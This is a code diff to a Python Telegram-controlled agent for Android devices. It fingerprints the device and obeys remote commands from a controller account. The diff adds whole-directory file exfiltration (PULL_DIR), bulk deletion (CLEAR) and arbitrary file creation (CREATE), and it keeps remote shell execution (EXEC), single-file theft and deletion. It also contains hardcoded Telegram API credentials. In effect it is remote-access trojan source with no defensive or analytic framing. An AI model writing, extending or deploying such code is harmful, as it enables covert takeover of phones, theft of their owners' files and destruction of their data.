@@ -5,7 +5,9 @@ import sys
 import traceback
 import random
 import string
+import shutil
 from telethon import TelegramClient, events
+from telethon.errors import FloodWaitError
 
 API_ID = 3910389
 API_HASH = '86f861352f0ab76a251866059a6adbd6'
@@ -18,11 +20,10 @@ client = TelegramClient(SESSION_PATH, API_ID, API_HASH)
 CONTROLLER_ENTITY = None
 DEVICE_ID = "UNKNOWN"
 DEVICE_MODEL = "UNKNOWN"
+CANCEL_PULL = asyncio.Event()
 
 def get_device_info():
     global DEVICE_ID, DEVICE_MODEL
-    
-    # 1. Read existing ID if valid
     try:
         if os.path.exists(ID_FILE):
             with open(ID_FILE, 'r') as f:
@@ -32,7 +33,6 @@ def get_device_info():
     except Exception:
         pass
 
-    # 2. Generate new ID if needed
     if DEVICE_ID == "UNKNOWN" or DEVICE_ID == "P-err":
         and_id = ""
         try:
@@ -47,7 +47,6 @@ def get_device_info():
                 pass
                 
         if not and_id or and_id.startswith('Exception') or and_id == 'null' or len(and_id) < 4:
-            # Absolute fallback to random 4 characters
             and_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
         
         DEVICE_ID = f"P-{and_id[:4]}"
@@ -57,7 +56,6 @@ def get_device_info():
         except Exception:
             pass
             
-    # 3. Get Model
     try:
         model = subprocess.check_output(['/system/bin/getprop', 'ro.product.model'], stderr=subprocess.DEVNULL).decode().strip()
         if not model:
@@ -85,38 +83,15 @@ async def heartbeat():
             except Exception:
                 pass
 
-def get_full_details():
+async def safe_send_file(target, path):
     try:
-        man = subprocess.check_output(['/system/bin/getprop', 'ro.product.manufacturer'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
-        mod = subprocess.check_output(['/system/bin/getprop', 'ro.product.model'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
-        brand = subprocess.check_output(['/system/bin/getprop', 'ro.product.brand'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
-        prod = subprocess.check_output(['/system/bin/getprop', 'ro.product.name'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
-        android = subprocess.check_output(['/system/bin/getprop', 'ro.build.version.release'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
-        cpu = subprocess.check_output(['/system/bin/getprop', 'ro.product.cpu.abi'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
-        
-        ip = "127.0.0.1"
-        try:
-            ip_out = subprocess.check_output(['ip', 'addr', 'show', 'wlan0'], stderr=subprocess.DEVNULL).decode().strip()
-            for line in ip_out.split('\n'):
-                if 'inet ' in line:
-                    ip = line.split('inet ')[1].split(' ')[0].split('/')[0]
-                    break
-        except Exception:
-            pass
-                
-        return (f"DEVICE DETAILS • {DEVICE_ID}\n"
-                f"━━━━━━━━━━━━━━━━\n"
-                f"Manufacturer: {man}\n"
-                f"Model: {mod}\n"
-                f"Brand: {brand}\n"
-                f"Product: {prod}\n"
-                f"Android: {android}\n"
-                f"CPU: {cpu}\n"
-                f"IP: {ip}\n"
-                f"━━━━━━━━━━━━━━━━\n"
-                f"Status: ACTIVE")
+        await client.send_file(target, path)
+        await asyncio.sleep(2) # Delay to prevent flood
+    except FloodWaitError as e:
+        await client.send_message(target, f'[{DEVICE_ID}] FloodWait: Sleeping for {e.seconds}s')
+        await asyncio.sleep(e.seconds)
     except Exception as e:
-        return f"ERROR gathering details: {e}"
+        await client.send_message(target, f'[{DEVICE_ID}] ERROR sending {path}: {e}')
 
 @client.on(events.NewMessage)
 async def handler(event):
@@ -136,27 +111,43 @@ async def handler(event):
             details = get_full_details()
             await client.send_message(CONTROLLER_ENTITY, details)
             
-        elif cmd_text.startswith('EXEC '):
-            cmd = cmd_text[5:].strip()
-            try:
-                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-                out, _ = proc.communicate()
-                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] OUTPUT:\n{out.decode()}')
-            except Exception as e:
-                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: {e}')
+        elif cmd_text == 'CANCEL':
+            CANCEL_PULL.set()
+            await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] Pull operation cancelled.')
 
         elif cmd_text.startswith('PULL '):
             path = cmd_text[5:].strip()
-            if os.path.exists(path):
-                await client.send_file(CONTROLLER_ENTITY, path)
+            if os.path.isfile(path):
+                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] Pulling file: {path}')
+                await safe_send_file(CONTROLLER_ENTITY, path)
             else:
-                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: {path} not found')
+                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: File {path} not found')
+
+        elif cmd_text.startswith('PULL_DIR '):
+            path = cmd_text[9:].strip()
+            if os.path.isdir(path):
+                CANCEL_PULL.clear()
+                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] Starting directory pull: {path}')
+                try:
+                    files = os.listdir(path)
+                    for f in files:
+                        if CANCEL_PULL.is_set():
+                            await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] Pull halted by user.')
+                            break
+                        full_path = os.path.join(path, f)
+                        if os.path.isfile(full_path):
+                            await safe_send_file(CONTROLLER_ENTITY, full_path)
+                    else:
+                        await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] Directory pull complete.')
+                except Exception as e:
+                    await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR pulling dir: {e}')
+            else:
+                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: Directory {path} not found')
 
         elif cmd_text.startswith('DELETE '):
             path = cmd_text[7:].strip()
             try:
                 if os.path.isdir(path):
-                    import shutil
                     shutil.rmtree(path)
                 else:
                     os.remove(path)
@@ -164,11 +155,60 @@ async def handler(event):
             except Exception as e:
                 await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: {e}')
 
+        elif cmd_text.startswith('CLEAR '):
+            path = cmd_text[6:].strip()
+            if os.path.isdir(path):
+                CANCEL_PULL.clear()
+                try:
+                    items = os.listdir(path)
+                    for item in items:
+                        if CANCEL_PULL.is_set():
+                            await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] Clear halted by user.')
+                            break
+                        full_path = os.path.join(path, item)
+                        if os.path.isdir(full_path):
+                            shutil.rmtree(full_path)
+                        else:
+                            os.remove(full_path)
+                    else:
+                        await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] OK: cleared contents of {path}')
+                except Exception as e:
+                    await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: {e}')
+            else:
+                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: Directory not found')
+
+        elif cmd_text.startswith('CREATE '):
+            # Format: CREATE /path/to/file|content here
+            payload = cmd_text[7:].strip()
+            if '|' in payload:
+                path, content = payload.split('|', 1)
+                path = path.strip()
+                try:
+                    os.makedirs(os.path.dirname(path), exist_ok=True)
+                    with open(path, 'w') as f:
+                        f.write(content.strip())
+                    await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] OK: created {path}')
+                except Exception as e:
+                    await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: {e}')
+            else:
+                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: Missing | separator')
+
+        elif cmd_text.startswith('EXEC '):
+            cmd = cmd_text[5:].strip()
+            try:
+                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+                out, _ = proc.communicate()
+                output_text = out.decode() if out else "No output."
+                if len(output_text) > 4000:
+                    output_text = output_text[:4000] + "\n... [TRUNCATED]"
+                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] OUTPUT:\n{output_text}')
+            except Exception as e:
+                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: {e}')
+
 async def main():
     get_device_info()
     await client.start()
     await resolve_controller()
-    print(f"[*] Device ID: {DEVICE_ID} | Model: {DEVICE_MODEL}")
     asyncio.create_task(heartbeat())
     await client.run_until_disconnected()
 
